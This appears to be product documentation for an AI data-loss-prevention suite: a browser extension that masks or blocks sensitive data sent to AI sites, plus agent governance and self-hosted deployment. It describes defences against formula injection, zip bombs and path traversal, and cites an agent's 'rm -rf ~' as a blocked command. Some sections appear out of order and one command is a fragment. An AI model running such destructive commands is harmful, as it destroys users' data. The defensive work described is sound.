What it does — Reads files the user selects, drops or pastes into a supported AI site, before the site gets them. Text files, Word/Excel/PowerPoint and OpenDocument documents with sensitive data are replaced with a sanitised copy (same name, same type). PDFs are scanned and blocked when they contain sensitive data. With the optional native host's OCR, screenshots and pictures inside documents that show sensitive data are blocked. Files that cannot be checked are flagged or blocked by policy, never passed off as clean.

Why it matters — A single CSV export can hold thousands of customer records. .env files and JSON configs are made of credentials. Uploads are a larger leak channel than typing.

How it works — Decision order (src/engine/files.ts):

  1. fileHandling: "allow" → passed through unread. fileHandling: "block" → blocked in every mode (reason FILE_BLOCKED_BY_POLICY).

  2. Larger than maxFileBytes (default 5 MiB, maximum 50 MiB) → blocked (FILE_TOO_LARGE). Office, OpenDocument, legacy Office and PDF documents go to the document handlers next (see "Office documents and PDFs" below). They are recognised by extension; a file with an unknown or missing extension is recognised by MIME type or content, so renaming a document does not skip it. Images (PNG/JPEG/WebP, recognised by content) go to OCR when the native host offers it (see "Images" below).

  3. Text or binary? A file is text when it decodes as strict UTF-8 (BOM allowed) or as UTF-16 with a byte-order mark, contains no NUL byte, and either has a known text/source extension or an unknown extension without a binary MIME type. Known binary extensions (images, archives, media, databases, executables…) are always binary.

  4. Binary files cannot be inspected in the browser. In block mode they are blocked (BINARY_FILE_UNSCANNABLE). In the other modes they are allowed with a warning toast (BINARY_FILE_UNSCANNED, plus a detail such as IMAGE_NOT_INSPECTED or LEGACY_OFFICE_FORMAT).

  5. Text formats

    • CSV/TSV: parsed properly (quoted fields, escaped quotes, CRLF/LF/CR). Cells are masked one by one with the column header as context, and a column whose header names a sensitive field (email, tckn, iban, name, password…) is masked wholesale. Formula injection is neutralised: cells starting with =, +, -, @, tab or CR get a leading ' (plain numbers such as -12.5 are left alone; reason FORMULA_CELL). Delimiter, quoting and line endings are preserved.

    • JSON / JSONL / NDJSON: only string and number values are rewritten, so the output is still valid JSON. Values under sensitive keys (password, token, api_key, secret, tckn, iban, cvv, connectionstring…, also as suffixes like db_password) are masked even when no rule matched.

    • .env files (.env, .env.*, *.env): every assigned value is masked as SECRET.

    • Everything else (source code, logs, Markdown, YAML, SQL, PEM…): plain-text masking.

  6. Risk signals in a file: with signalAction: "block" the file is blocked (SIGNAL_<CODE>).

  7. An incomplete scan is retried in smaller overlapping windows. If it still cannot complete, the file is blocked (SCAN_INCOMPLETE). Any internal error blocks it (FILE_SCAN_ERROR).

Office documents and PDFs (src/engine/office/, src/engine/pdf/, managed key documentHandling, default mask). Everything runs in the content script: a small ZIP reader/writer on the browser's DecompressionStream/CompressionStream, a strict XML scanner and a PDF text extractor. There is no remote code, no WebAssembly and no new dependency.

  • DOCX, XLSX, PPTX (also docm/xlsm/pptm, templates and shows): the text is masked in place and the package is re-zipped. Word paragraphs are scanned as a whole, so an email address or TCKN that Word split across differently formatted runs is still found. The placeholder goes into the first run and the rest of the value is removed from the others. Only the runs that held the value change, and their formatting is kept. Covered: body, headers, footers, footnotes and endnotes, comments and their authors, tracked changes, field codes, text boxes and tables. In Excel: shared strings (including rich text), inline strings, formula string results and number/date cells. A masked number becomes a text cell; a formula cell keeps its formula and gets a text result. Comments, pivot-cache strings and header/footer text are covered, and a column whose header names a sensitive field is masked wholesale, as for CSV. In PowerPoint: slides, speaker notes, layouts, masters and comments. In every format: charts, diagrams (SmartArt), drawings, alternative text, document properties, and the targets of mailto: and other external hyperlinks. Styles, fonts and every other part are copied byte for byte (pictures: see below). Result: mask with SENSITIVE_DATA, or allow when nothing was found.

  • ODT, ODS, ODP, ODG (OpenDocument, e.g. LibreOffice, and their templates) use the same ZIP reader/writer, XML scanner and limits and are masked in place the same way: paragraphs over their spans, links and fields; footnotes, annotations and text boxes; headers and footers, document metadata, hyperlink targets, cell values and formulas. Tables use their first row as column headers (a sensitive header masks the column); a cell is masked as a unit and a masked number/date cell becomes a text cell. Embedded objects (charts) are masked inside the package. Refused as for Office: encryption, Basic/script libraries and script event listeners, DDE and linked sections, sheets or objects, plugins/applets/frames, OLE objects and other binary parts such as embedded media.

  • Legacy .doc, .xls, .ppt (OLE compound files, also recognised by content or MIME type) are read by a bounded, dependency-free compound-file reader in the browser and their text is scanned, but never rewritten (patching binary record formats in place is not safe). Read: Word body, headers/footers, footnotes, comments, text boxes and field codes (8-bit and UTF-16 pieces of the piece table); Excel shared strings, text/number/formula cells (the first row as column headers, as for XLSX), sheet names, headers/footers, comments and their authors, hyperlink targets; PowerPoint slide, notes, master and comment text and hyperlinks; document properties; and embedded Word/Excel/PowerPoint objects. A file with findings is blocked (SENSITIVE_DATA_IN_LEGACY_OFFICE) and the user is told to save it as .docx/.xlsx/.pptx, which AIDR masks; monitor records it. A completely read, clean file is allowed. A file that may not have been read completely (Word 6/95, Excel 5/95, pivot caches, damaged records, or not a compound file at all) is never reported as checked: it is uploaded with a "could not be fully checked" warning (LEGACY_OFFICE_FORMAT plus LEGACY_OFFICE_UNSUPPORTED, LEGACY_OFFICE_PARTIAL or DOCUMENT_UNPARSEABLE), blocked in block mode; findings in the readable part still block. Password protection, VBA or Excel 4.0 macros, other embedded objects, and a corrupt or adversarial container (cyclic sector chains, sectors outside the file, truncation, over the size limits) are refused (DOCUMENT_ENCRYPTED, DOCUMENT_MACROS, DOCUMENT_EMBEDDED_OBJECT, DOCUMENT_MALFORMED, DOCUMENT_LIMIT_EXCEEDED). documentHandling: "block" refuses them with the other documents.

  • Pictures inside Office and OpenDocument files: the first-page thumbnail shows the text before masking, so a rewritten package gets a blank thumbnail. With the native host's OCR, PNG/JPEG/WebP pictures are inspected and a picture with sensitive text blocks the document (SENSITIVE_DATA_IN_IMAGE). Pictures that were not inspected (no OCR, other formats, more than 16 pictures, a 90-second OCR budget) add DOCUMENT_IMAGES_NOT_INSPECTED and a warning.

  • Refused (blocked; monitor only records): macros or ActiveX (DOCUMENT_MACROS), password protection (DOCUMENT_ENCRYPTED), external workbook links, data connections, remote templates, linked objects or mail-merge sources (DOCUMENT_EXTERNAL_LINKS; ordinary hyperlinks are allowed and their targets are scanned), embedded objects that are not DOCX/XLSX/PPTX (DOCUMENT_EMBEDDED_OBJECT; embedded workbooks, such as chart data, are sanitised the same way), malformed XML or a DOCTYPE declaration (DOCUMENT_MALFORMED), and unsafe archives (ARCHIVE_*): ZIP64, more than 4,096 entries, a declared compression ratio above 200:1 for an entry over 1 MiB, an entry over 48 MiB or more than 64 MiB inflated in total, path traversal, duplicate or overlapping entries, or a CRC mismatch. Inflation stops as soon as an entry exceeds its declared size, so a zip bomb is never expanded.

  • PDF: text is extracted (object and cross-reference streams; Flate, LZW, ASCIIHex, ASCII85 and RunLength filters; WinAnsi, MacRoman and Standard encodings with /Differences, including Turkish letters; ToUnicode maps for Identity-H fonts; Form XObjects; annotations, form-field values and document info) and scanned. PDFs are not rewritten. A PDF with findings is blocked (SENSITIVE_DATA_IN_PDF) and the bubble tells the user to paste the text instead, where it is masked. monitor records it. A PDF without extractable text (scanned), with image-only pages or parts that cannot be decoded (PDF_NO_TEXT, PDF_PARTIAL), encrypted (PDF_ENCRYPTED) or unparseable (PDF_UNPARSEABLE) follows the binary rule: uploaded with a warning, blocked in block mode. Findings in the readable part still block it.

  • Images inside PDFs (photos, screenshots, scanned pages): every image a page draws (directly or through Form XObjects), inline images and image XObjects referenced elsewhere (annotation appearances, for example; soft masks excluded) go through the same native-host OCR as uploaded images. JPEG (DCTDecode) data is sent as is; Flate, LZW, RunLength and ASCII-encoded images in DeviceGray, DeviceRGB, DeviceCMYK, ICCBased, Indexed or Separation colour spaces (1 to 16 bits, PNG predictors) are re-encoded as PNG in the browser. An image with sensitive text blocks the PDF (SENSITIVE_DATA_IN_IMAGE; monitor records it). If any image that can hold text (8x8 pixels or larger) is not read to a verdict, the PDF is handled like an uninspected image: PDF_IMAGES_NOT_INSPECTED, uploaded with a warning, blocked in block mode, never reported as clean. The detail code says why: no host or no OCR (PDF_IMAGE_OCR_UNAVAILABLE), JPEG 2000, JBIG2, CCITT, DeviceN/Lab or a TIFF predictor (PDF_IMAGE_UNSUPPORTED), corrupt or truncated data (PDF_IMAGE_UNDECODABLE), more than 16 images, over 12 megapixels, 8,192 pixels per side or 8 MiB, or past the 90-second OCR budget (PDF_IMAGE_LIMIT), or an OCR result the host marks incomplete (PDF_IMAGE_OCR_INCOMPLETE plus the host's code). The host reports a picture without any text (a logo or a photo) as incomplete (IMAGE_NO_TEXT), so a PDF containing one is also reported as not inspected. A PDF whose text and images are all clean is allowed (PDF_IMAGES_OCR_CLEAN); this includes a scanned PDF whose every page image was OCR'd clean.

  • Images (screenshots, photos): with useNativeHost and a native host configured with OCR, the image is OCR'd on the endpoint (counts only; the host returns no pixels or text). Sensitive text blocks the upload (SENSITIVE_DATA_IN_IMAGE; pixels are never masked); a clean result lets it through. Without the host or its OCR, or when OCR could not read the whole image (no text, uncertain words, a barcode, limits), the image is not inspected (IMAGE_NOT_INSPECTED): uploaded with a warning, blocked in block mode.

  • documentHandling: "block" refuses every Office/OpenDocument/PDF upload in every mode (DOCUMENT_BLOCKED_BY_POLICY). documentHandling: "allow" skips document parsing: the file follows the binary rule (step 4). A document whose scan takes longer than 30 seconds is blocked (SCAN_INCOMPLETE).

In monitor mode (and while paused) files pass unchanged and are only counted. Blocked sites and fileHandling: "block" are enforced in every mode.

The scenario file-upload-docx uploads such a file on the ChatGPT fixture and re-opens the uploaded bytes to check word/document.xml; file-upload-pdf-blocked checks that a PDF with an email address never reaches the page and that the bubble suggests pasting the text instead. file-upload-odt does the same for an ODT whose values are split across spans, file-upload-pptx-thumbnail checks that a masked presentation's thumbnail is replaced by a blank image Chromium decodes, and file-upload-legacy-doc checks the "could not be fully checked" warning for a Word 95 .doc, and file-upload-legacy-doc-blocked that a .doc with an email address never reaches the page and that the bubble suggests saving it as .docx.

Availability

PlanTeam, Business, Enterprise (catalog)
DeploymentLocal / Cloud / On-prem / Air-gapped
PlatformsChrome, Edge, Firefox (desktop)

Limitations

  • There is no OCR in the browser itself. Images and pictures inside Office/OpenDocument files are OCR'd only through the optional native host with OCR configured, and are blocked (never masked) when they show sensitive data; OCR can miss small, handwritten or low-contrast text. Without the host they are reported as not inspected, not as clean. Images inside PDFs, scanned pages included, are extracted in the browser and OCR'd the same way; without the host a PDF that contains images is reported as not inspected. OCR accuracy has not been measured on real documents or images. Set fileHandling: "block" or documentHandling: "block" if such uploads must never reach AI sites.

  • PDFs are scanned but never rewritten, so a PDF with findings is blocked rather than masked. Encrypted PDFs are not decrypted; Type0 fonts without a ToUnicode map and predefined CJK CMaps are not decoded (reported as PDF_PARTIAL); word and line breaks are rebuilt from glyph positions and can differ from the reading order in multi-column layouts.

  • Office masking covers text. Sheet names, defined names, table column names and numeric pivot-cache values are not rewritten (a masked header cell can make Excel repair a table's column name); the same applies to OpenDocument sheet and table names. Legacy .doc/.xls/.ppt files are scanned but never masked: one with findings is blocked and has to be saved as .docx/.xlsx/.pptx to be uploaded masked. Their pictures are not OCR'd, Word revision/comment author tables and Excel defined names and data-validation lists are not read, and pivot caches are not parsed (the file is reported as partly read).

  • Text files that are not UTF-8 are decoded as Windows-1254 (Turkish), or Windows-1252 when that fits better, then scanned, and a masked copy is uploaded as UTF-8 (CSV/TSV with a BOM). Files in other single-byte encodings (for example Cyrillic Windows-1251) are decoded with one of those two code pages, so their non-Latin characters come out wrong and values written in them can be missed. A text-named file containing NUL bytes (for example UTF-16 without a BOM) cannot be decoded safely and is blocked (TEXT_FILE_NOT_DECODABLE), except in monitor mode.

  • For text files, confirm and block modes do not show a dialog. The sanitised copy is uploaded. Only fileHandling: "block" refuses all uploads.

  • A file larger than maxFileBytes is blocked, not scanned partially.

8. Custom terms (organisation literals)

What it does — Masks words and names the built-in rules cannot know: project code names, client names, internal hostnames, product names under embargo.

Why it matters — "Project Kartal budget is 12M" contains no personal data, but it may be the most confidential sentence a user types all year.

9. Exact data match

What it does — Flags an organisation's own records (customer names, account numbers, employee IDs) without shipping the values to the browser. The browser receives only keyed fingerprints.

Why it matters — Rules find anything that looks like an IBAN. Exact data match finds your customers, including names that no rule can recognise, while the list itself never leaves the administrator's hands in readable form.

How it works

  1. The administrator builds a dataset from a CSV with packages/browser-guard/scripts/fingerprint-dataset.mjs. Each value is normalised (NFKC, lower-case, zero-width marks removed, Turkish ı and i̇ folded to i) and split into letter/digit tokens. The fingerprint is HMAC-SHA256(key, JSON.stringify(tokens)) in lowercase hex. A value must give 1–16 tokens and at least 3 characters.

  2. The dataset { datasetId, keyB64, fingerprints, type } is delivered by managed policy (exactData).

  3. In the page, the same normalisation is applied to the prompt. Every window of up to 16 consecutive tokens is fingerprinted with WebCrypto (at most 65,536 HMACs per scan) and compared with the dataset. A hit is masked as the dataset's type and also raises the EXACT_DATA_MATCH signal.

How to use

node packages/browser-guard/scripts/fingerprint-dataset.mjs \
  --in customers.csv --header --columns full_name \
  --dataset-id crm-customers --type PERSON \
  --key-file crm.key.b64 --out crm-customers.json

Options: --in <file.csv|->, --dataset-id, --type <ENTITY_TYPE>, --header, --columns a,b, --key-b64 <base64> or --key-file <file>, --out <file.json>. Without a key option a fresh 32-byte key is generated. Keep it so that regenerated datasets produce the same fingerprints. The output file is written with mode 0600, and fingerprints are sorted so the file order reveals nothing about the source rows. Put the JSON object into the managed exactData array. The policy accepts at most 16 datasets and 100,000 fingerprints in total. The tool itself accepts up to 250,000 per dataset, but a policy over the limit is rejected.

Privacy of fingerprints — Only fingerprints and the HMAC key are in the dataset. Source values are never written or logged. Fingerprints are keyed hashes, not encryption: anyone holding the dataset (which includes the key) can test guesses against it. Treat the dataset as confidential, distribute it only through managed policy, and never commit it to a repository. The example dataset in deploy/browser-guard/ holds REPLACE_WITH_... placeholders instead of a key and fingerprints; the extension refuses it until it is replaced with real fingerprint-dataset.mjs output.

Example — Dataset crm-customers (type PERSON) contains the fingerprint of "Ahmet Kaya". The prompt Ahmet Kaya called about his order is found even though no rule recognises the name. With default settings (detectSignals: true, signalAction: "warn"), the user sees the confirmation bubble with the coaching line "This text matches records from a protected company dataset. Remove them before sending, or use an approved channel."

Availability

PlanTeam, Business, Enterprise (catalog)
DeploymentLocal / Cloud / On-prem / Air-gapped (dataset delivered by browser policy; the tool runs offline on Node.js)
PlatformsChrome, Edge, Firefox (desktop); the tool needs Node.js 22.12+

Limitations

  • Matching is on exact token sequences after normalisation. Typos, reordered names and partial values do not match.

  • Policy size limits (100,000 fingerprints in total) cap the dataset size.

  • Browser policy is readable on the endpoint, so the key and fingerprints are exposed to local users (see above).

13a. Shadow AI discovery and control

What it does — Shows which generative-AI services people open in managed browsers (sanctioned or not) and, if you choose, blocks every service you have not approved.

Why it matters — Most AI use in a company happens in tools nobody approved. Before you can decide what to allow you need to know what is used, and afterwards you need the decision enforced in the browser.

How it works — Browser Guard ships a catalog of about 75 well-known services (packages/browser-guard/src/sites/catalog.ts): chat assistants (ChatGPT, Gemini, Claude, Poe, Character.AI, Meta AI, Kimi, Qwen, Doubao, ERNIE, ...), coding tools and app builders (Cursor, v0, Bolt, Lovable, Replit, Windsurf, AI Studio, ...), image/video/voice (Midjourney, Leonardo, Ideogram, Runway, ElevenLabs, ...), meeting assistants (Otter, Fireflies, tl;dv, ...), writing (Jasper, QuillBot, DeepL, Grammarly, Gamma, ...), search (Perplexity, You.com, Consensus, ...) and agents (Devin, Manus, Genspark). 15. Counts-only telemetry and the Browser Privacy dashboard

What it does — Enrolled browsers report how many items of each type were masked, warned, blocked or allowed on each AI site. The control plane shows these counts on its Browser Privacy page (/privacy-guard).

Why it matters — Security teams need to show where personal data exposure happens and whether it is falling, without building a second copy of that personal data in a monitoring system.

How it works — When telemetry is set, the background worker queues privacy_scan events in chrome.storage.local (at most 500; the oldest are dropped). It sends them roughly once a minute, or as soon as 50 are pending, in batches of up to 200. The request is a POST {controlPlaneUrl}/functions/v1/ingest with Authorization: Bearer <apiKey>. Failed sends retry with exponential backoff plus jitter (capped at one hour). Batches rejected with HTTP 400/413/422 are dropped. Telemetry never delays the user.

Each event contains exactly (per docs/contracts/privacy-telemetry.md): event_id, event_type: "privacy_scan", timestamp, site (site id), action (masked | blocked | warned | allowed), channel (prompt | paste | file), entity_counts (for example { "EMAIL": 2, "TC_KIMLIK": 1 }), findings_count and policy_id. The envelope adds a random per-install ID (iid), agent_runtime: "browser_guard", the browser family and major version (for example chrome-126) and the extension version. Content scripts never receive the API key.

The dashboard page Browser Privacy Guard shows, for a 7- or 30-day window: Prompts protected, Items masked, Blocked sends, Active browser installs, By entity type, By AI site, Daily activity and Recent privacy events. An Enroll browsers panel generates a managed-policy JSON snippet for a chosen mode, with the control-plane URL filled in and a placeholder for the tenant API key. Events are stored under the tenant's telemetry retention class and read only by tenant members.

How to use

  1. Create a write-capable tenant API key on the dashboard's API Keys page.

  2. Put telemetry: { "controlPlaneUrl": "https://…", "apiKey": "…" } into managed policy, or let a user enter it under Options → Organization connection (Save connection, Disconnect).

  3. Counts appear on /privacy-guard within about a minute.

Example — A user in auto mode sends a prompt with two email addresses on ChatGPT. The event reads site: "chatgpt", action: "masked", channel: "prompt", entity_counts: {"EMAIL": 2}, findings_count: 2. The dashboard's "By AI site" row for ChatGPT increases by one scan and two items.

16. Optional native host for NER and OCR

What it does — Connects the extension to the AIDR Privacy native messaging host (com.singularity.aidr_privacy) on the same machine. The host is intended to add learned named-entity recognition (NER) for names, addresses and locations that have no fixed shape, and, when configured with local OCR, to read the text in uploaded images.

Why it matters — Rules cannot recognise "Ahmet Kaya" in a sentence. A local NER model can, without sending text off the machine.

How it works — When useNativeHost is on, every prompt and paste scan asks the background worker for NER (NATIVE_SCAN) in parallel with the built-in rules. The worker's bridge speaks the privacy host's native-messaging protocol over the browser's stdio pipe. There is no socket and no localhost HTTP endpoint. Each scan uses a fresh host process and a 2-second budget (the page waits at most 2.5 seconds). Text over 200,000 characters is not sent. After three consecutive failures the host is considered unavailable for 60 seconds. The host's PERSON, ADDRESS and LOCATION spans (only types enabled in enabledEntities) are tagged source: "native-ner" with a fixed score of 0.9 and merged with the rule findings before masking. When the host gives no usable answer the prompt is checked with the rules only, and the in-page toast or bubble says "Advanced name and address detection (native host) is unavailable: checked with built-in rules only." (once per page for prompts that turn out clean). Nothing is persisted, and only the text itself is sent (no URL, site, tab or user data). Uploaded images (and pictures inside Office/OpenDocument files) are sent the same way as an image-scan (NATIVE_IMAGE_SCAN) when the host reports OCR: the host OCRs them and returns a decision with counts only, and a sensitive image is blocked (feature 7). The page waits at most 65 seconds per image.

How to use (see packages/browser-guard/docs/native-host.md):

  1. Install and register the host from packages/privacy (docs/BROWSER.md §4, deployment/README.md), with an approved NER model block. Without one the host reports coverage: "rules-only".

  2. Admit Browser Guard's extension ID: node native/prepare-host.mjs --config <abs> --out <abs> --extension-id <browser-guard-id>.

  3. Turn it on: managed key useNativeHost: true, or Options → Protection → Use the AIDR Privacy helper app (not available when the administrator manages the key).

  4. Grant the optional nativeMessaging permission: turning the switch on asks for it, and when the administrator enabled the host the options page shows Grant permission. Browsers do not let policy grant this optional permission, so each user confirms it once.

Example — With the host installed and enabled, the popup and the options page show "Advanced detection is connected", and "Write to Ahmet Kaya" is sent as "Write to [PERSON_1]". Otherwise they show "Advanced detection is unavailable; built-in rules are active", protection continues with the built-in rules, and the in-page message says the check was rules-only.

Availability

PlanNot listed as a separate plan feature
DeploymentLocal (endpoint process); managed endpoints
PlatformsChrome and Edge only (the host accepts only chrome-extension:// callers; Firefox reports unavailable)

Limitations — read before relying on it

  • NER is applied to prompts and pasted text only. Uploaded files are scanned with the rules; only images go to the host, for OCR.

  • The host returns a sanitised copy rather than spans. The bridge maps it back to the input and widens ambiguous spans (over-masking rather than leaking); output it cannot map counts as "no NER result" for that prompt.

  • A prompt that is still being scanned by the host takes up to 2.5 seconds longer to send.

  • packages/privacy ships the host protocol but no NER model weights and no accuracy evidence. Measure precision and recall on your own data.

  • OCR comes from the privacy package's visual layer (feature 20), used decision-only: an image with sensitive text is blocked, never masked. Images inside PDFs (scanned pages included) are extracted by Browser Guard and sent through the same path. OCR needs the host's optional Python/Tesseract stack; the protocol is tested with fake OCR workers, and real OCR accuracy must be measured on your own images.

  • A heavy model plus a large prompt can exceed the 2-second budget, and the bridge then backs off to rules only.

Security hardening present in this build

These protections are in the code on this branch and covered by unit or real-browser tests:

  • Closed shadow roots for the bubbles, toasts and restored values. The host page cannot read them, and the page's own DOM keeps the placeholder (fixed in this build: without the slot, Chromium's innerText returned an empty string where a value was restored).

  • Sender validation in the background worker: only the extension's own pages may change settings. Content scripts are accepted only from the exact HTTPS hosts of supported sites, are limited to their own tab and never receive the telemetry API key.

  • Strict policy validation: malformed managed values are ignored per key and logged by key name only. User settings are suspended while managed storage cannot be read.

  • No remote code: a strict extension CSP (script-src 'self'). The build fails if a bundle contains eval, new Function, string timers, importScripts, dynamic import() or document.write, or references an unexpected remote origin. Release zips are deterministic, with SHA256SUMS.

  • Minimal exposure: only blocked.html is web-accessible, and its stylesheet and script are not. The extension does not run in incognito windows.

  • Managed-schema compatibility: the build rejects schema patterns that Chrome's RE2 engine cannot compile. A bad pattern would otherwise stop the whole extension from loading.

  • Bounded detection cost: the JWT rule was rewritten so that crafted input cannot make it quadratic. Scans stop at 200,000 characters and at an internal time budget, and are then reported as incomplete (fail closed).

What it does. /policies is policy as code for enrolled agents. The Security Policy Editor stores strict YAML team policy documents with validation. Runtime policy publishes the compiled JSON controls that connectors fetch: default actions per artifact type and MCP server and tool lists.

Why it matters. Local rules catch known-bad behaviour. Central policy lets a security team set organisation-wide defaults, for example "ask before any unknown MCP server" or "deny writes outside the repository", and change them without touching every laptop.

AI governance: asset register, intake, exceptions and change control

What it does. Records which AI systems are in use, who owns them and why, who may use which AI and who approved it, which exceptions are in force until when, and who changed security policy with whose approval. Pages: AI register (/governance/register), Requests & exceptions (/governance/requests) and Change control (/governance/change-control).

Why it matters. Security, data-protection and AI governance boards ask these questions under frameworks such as the EU AI Act, GDPR and KVKK. The answers should come from one record that also drives enforcement where it can.

How it works.

  • Asset register. One entry per coding agent, MCP server, AI chat site or model service: owner, business purpose, data categories (personal, special category, source code, secrets, customer data), an EU AI Act-style risk tier, status (proposed, approved, restricted, banned, retired), next review date and linked evidence (posture findings, incidents, approval requests). Import observed AI systems adds a proposed entry for each agent, MCP server, AI site and model endpoint the control plane has seen.

  • What a status enforces. A banned MCP server is blocked by every managed connector (deny); a restricted one needs out-of-band approval (ask). The lists reach connectors next to the published runtime policy, digest-checked, at the next policy refresh. A banned AI chat site is listed in a Browser Guard managed-policy snippet (blockedSites) that the administrator deploys through browser management; Browser Guard does not fetch it by itself. Anything else is recorded only. The register only adds restrictions; it never relaxes a published policy.

  • Intake. Owners, admins and members request a new AI tool or a status change with a purpose and the data involved. Owners, admins or designated reviewers decide with a reason, and never the requester (enforced by the database).

  • Time-boxed exceptions. A waiver of a ban or restriction for named members, agents or everyone, with a justification and an end date within 365 days, approved by an owner or admin other than the requester. The end date is checked on every policy fetch, so an expired exception stops applying on its own.

  • Four-eyes change control. While on, publishing runtime or DLP policy, rollbacks, staged rollouts and relaxing a register status become change requests that a second owner or admin approves after reviewing the diff. The database enforces it; turning it off is itself a change request.

  • Every change needs multi-factor verification and is written to the audit log in the same transaction.

How to use. Open AI register, choose Import observed AI systems, then assign owners and review dates. Turn on four-eyes on Change control (needs two active owners or admins). Details: docs/ai-governance.md.

Example. An administrator bans the shell-runner MCP server. Within the next policy refresh every managed agent in the workspace is denied calls to it. A developer requests an exception for a migration; another administrator approves it for three named members until month end, after which it stops applying without anyone intervening.

7. Telemetry and its privacy

Redacted, counts-only telemetry

What it does. Enrolled endpoints send the control plane minimised events: agent verdicts, incidents, plugin and posture findings, policy cache receipts and Browser Guard privacy_scan counts.

10. Backups and restore drills

Encrypted offsite backup and scheduled restore drill

What it does. For Compose installations, deployment-backup.mjs makes a cold, encrypted and authenticated backup of the database and storage. deployment-backup-offsite.mjs copies it to a separate filesystem or S3-compatible target and verifies it. deployment-restore-drill.mjs restores the newest good backup into an isolated project and records RPO and RTO results.

Why it matters. A backup that has never been restored is a hope, not a control. The drill turns recovery into evidence.

How it works. The upload goes to a random staging prefix, is checked by size and SHA-256, copied to an immutable id and downloaded again for an independent digest check. COMMITTED.json is copied last, so an interrupted transfer never counts as complete. Optional S3 Object Lock (GOVERNANCE or COMPLIANCE) makes objects WORM. The offsite target never receives the recovery key; only a --key-reference such as a vault or HSM URI is recorded. The weekly drill timer verifies the signed release candidate, restores into owner-only temporary directories and removes all recovered material afterwards.

  --target s3://company-backups/aidr/production --s3-region eu-central-1 \
  --key-file /run/credentials/aidr-recovery.key --key-reference hsm://security/aidr-recovery \

What it does. The dashboard server exposes GET /livez (the process answers), GET /readyz (every production dependency is ready) and GET /metrics (Prometheus readiness gauges and request counters behind a bearer token). deploy/monitoring ships 17 Prometheus alert rules.

Why it matters. A green container is not a working security service. /readyz fails until signing, backups, the telemetry queue and TLS are actually healthy.

How it works. /readyz checks seven things by default: database, storage, functions, signing, backup, queue and certificate. Production startup rejects any subset. Signing, backup and queue health come from evidence files that producers write atomically under /run/aidr-health. Metrics contain no URLs, tenant ids, key ids or secrets. The alerts include AIDRControlPlaneNotReady, AIDRDatabaseUnavailable, AIDRSigningKeyExpiresSoon, AIDRBackupUnhealthy, AIDRQueueGrowing, AIDRCertificateExpiresSoon and AIDRDashboardErrorBudgetBurn.

How to use. Scrape /metrics with the generated AIDR_METRICS_TOKEN, load deploy/monitoring/prometheus-alerts.yml, and route alerts to your on-call team. Run node scripts/deployment-doctor.mjs --deployment /srv/aidr --online after every change.

Example. An offsite backup has not completed for longer than its threshold. /readyz returns 503, and AIDRBackupUnhealthy fires.

Availability.

PlanDeploymentPlatforms / OS
Self-hosted plansOn-prem Compose, Helm (the evidence worker must be run; no CronJob yet), Air-gapped; Cloud: operated by the providerPrometheus-compatible monitoring

Limitations. Evidence files are operational attestations: anyone who can write them can fake readiness, so protect them. The Doctor reports UNVERIFIED when it cannot inspect the host, and that is never a pass.

Local mode (no control plane)

What it does. Connectors and Browser Guard run with local settings only. There is no account, enrollment or network requirement for detection.

Why it matters. Protection starts at install time, even on a laptop that never talks to a server, and it keeps working if the control plane or licence goes away.

How it works. mode defaults to "local". Rules, allowlists, the audit log and operator approvals (aidr pending, aidr approve) all live on the endpoint under ~/.singularity-aidr/.

How to use. Install a connector and run aidr setup. See docs/configuration.md.

Example. A contractor laptop with no corporate network still blocks rm -rf ~ from an agent and writes the verdict to the local audit log.

Availability.

Limitations. No central view, policy, enrollment or telemetry. Each endpoint's settings are managed locally.

Cloud (SaaS)

What it does. SingularityRD operates the dashboard, database and Edge Functions. You get tenants, SSO and SCIM, device enrollment, signed policy with staged rollout, signed rule and intel packs, ingest, incidents, audit export and SIEM delivery.

Why it matters. It gives the fastest start, with no servers to run.

How it works. Endpoints still enforce locally and send only the redacted data described in section 7. The commercial decision covers EU, US and APAC regions, recorded as declarations in deploy/regions.manifest.json. A region becomes available when its hosted project, residency terms and subprocessor list are approved.

How to use. Sign up where signup is open, start the trial, enroll endpoints, deploy connectors and Browser Guard, then publish policy. See docs/deployment/saas.md.

Limitations. The hosted service is not yet accepted for customer use. A 99.9% monthly availability target was chosen for contract discussion. It is not an SLA.

On-premises with Docker Compose

What it does. You run the whole control plane on one Linux host of your own. scripts/deployment-prepare.mjs --mode self-hosted generates the stack from the pinned Supabase self-hosted baseline (v0.8.1) plus the AIDR dashboard, with lifecycle tools for migrate, bootstrap, doctor, backup, restore drill, upgrade, maintenance, TLS and offboarding.

Why it matters. Telemetry, identities and policy stay on your network, under your retention and your change control.

How it works. Preparation writes a private (0700) directory with compose.yml (merged with compose.onprem.overlay.yml for restart policy, log rotation, health checks and resource limits), .env, .env.functions, .env.readiness and .env.ingress (all 0600), migrations, functions, agent-config.json and deployment.json. Ports bind to loopback, so your TLS proxy fronts them. Three resource profiles set per-service CPU, memory and PID limits (see sizing). The optional deep-scan sidecar (--with-posture-scanner) adds the deep-scan server, agent and bridge under Compose profile posture-scanner. The bridge is published on 127.0.0.1:8099 only. Remote scans leave only through a pinned Squid egress gateway that denies everything by default. You list authorized domains in /srv/aidr/posture-scanner/egress/allowlist.txt. Loopback, private, CGNAT and reserved destinations are refused even if listed.

How to use.

node scripts/deployment-prepare.mjs --mode self-hosted --output /srv/aidr --profile small \
  --region self-hosted --tenant-region self-hosted \
  --dashboard-url https://aidr.customer.example --supabase-url https://api.aidr.customer.example \
  --artifact-verification-public-key-file /secure-delivery/aidr-artifact-signing-public.pem \
  --telemetry-queue-root /var/lib/aidr-telemetry
docker compose --project-directory /srv/aidr -f /srv/aidr/compose.yml up -d --build
node scripts/deployment-migrate.mjs /srv/aidr
node scripts/deployment-doctor.mjs --deployment /srv/aidr --online

Add --with-posture-scanner --posture-scanner-signing-public-key-file <pem> --posture-scanner-signing-key-id <id> for the scanning sidecar. Every setting is listed in the on-prem configuration reference (docs/operations/onprem-config-reference.md) (pnpm onprem:config-reference).

Example. A container keeps restarting with exit code 137. It hit its memory limit, so the operator moves to --profile medium in the next maintenance window.

Availability.

PlanDeploymentPlatforms / OS
Business, EnterpriseOn-prem, Air-gapped64-bit Linux (x86_64 or arm64) with systemd, Docker Engine with Compose, Node 24

Limitations. One host: no multi-host high availability or availability SLA. The doctor fails until TLS, the device-start signer, evidence and backup timers and the first account exist. The committed deep-scan data manifest is unsigned, so the bridge reports not-ready until a release-signed manifest is deployed.

Kubernetes with Helm

What it does. The chart deploy/helm/aidr installs the same control plane on Kubernetes 1.25+. It runs the dashboard, an Envoy API gateway, auth, REST, storage, functions, an optional in-cluster Postgres, a migrations hook Job, an optional backup CronJob and the optional deep-scan stack (postureScanner.enabled).

